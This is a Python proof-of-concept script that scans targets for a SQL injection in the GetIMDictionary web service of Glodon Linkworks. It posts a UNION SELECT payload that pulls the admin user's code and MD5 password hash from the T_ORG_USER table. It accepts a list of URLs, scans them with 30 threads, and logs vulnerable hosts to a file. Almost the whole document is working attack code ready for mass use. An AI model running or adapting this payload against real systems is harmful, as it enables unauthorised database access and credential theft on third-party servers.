#广联达 Linkworks GetIMDictionary SQL注入漏洞poc
import argparse,json,requests,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test="""


 ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗ ██████╗ ██╗     ██╗ █████╗ ███╗   ██╗██████╗  █████╗       ██╗     ██╗███╗   ██╗██╗  ██╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗███████╗
██╔════╝ ██║   ██║██╔══██╗████╗  ██║██╔════╝ ██║     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗      ██║     ██║████╗  ██║██║ ██╔╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██╔════╝
██║  ███╗██║   ██║███████║██╔██╗ ██║██║  ███╗██║     ██║███████║██╔██╗ ██║██║  ██║███████║█████╗██║     ██║██╔██╗ ██║█████╔╝ ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ███████╗
██║   ██║██║   ██║██╔══██║██║╚██╗██║██║   ██║██║     ██║██╔══██║██║╚██╗██║██║  ██║██╔══██║╚════╝██║     ██║██║╚██╗██║██╔═██╗ ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚════██║
╚██████╔╝╚██████╔╝██║  ██║██║ ╚████║╚██████╔╝███████╗██║██║  ██║██║ ╚████║██████╔╝██║  ██║      ███████╗██║██║ ╚████║██║  ██╗╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗███████║
 ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝      ╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
                                                                                                                                                                        
                                                              autho:zm
"""
    print(test)
def main():
    banner()
    parer=argparse.ArgumentParser(description='This is Guanglianda Linkworks FHIR MDictionary SQL injection vulnerability')
    parer.add_argument('-u','--url',dest='url',type=str,help='Please enter your link')
    parer.add_argument('-f','--file',dest='file',type=str,help='Please enter your file path')
    ages=parer.parse_args()
    if ages.url and not ages.file:
        poc(ages.url)
    elif ages.file and not ages.url:
        url_list=[]
        with open (ages.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(30)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")
def poc(target):
    payload = '/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary'
    headers = {
        'Content-Type':'application/x-www-form-urlencoded',
    }
    data = "key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --"
    try:
        res1=requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)
        if res1.status_code == 200:
            match = re.search(r'value="admin:(.*?)"', res1.text)
            if '22917F3B8A9904A2FCC0F41176668374' == match.group(1):
                print(f"[+] {target} 存在漏洞 “{target+payload}”")
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
            else:
                print(f"[-] {target} 没有漏洞 ")
        else:
            print(f"[-] {target} 没有漏洞 ")
    except:
        pass
if __name__=='__main__':
    main()